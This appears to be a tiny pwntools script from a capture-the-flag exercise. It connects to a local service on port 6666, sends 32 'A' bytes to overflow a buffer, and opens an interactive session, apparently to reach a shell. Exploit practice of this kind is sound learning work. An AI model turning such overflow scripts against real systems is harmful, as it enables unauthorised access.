from pwn import *

# p = process("./main")
p = remote("localhost",6666)
p.sendline(32*b"A")
p.interactive()
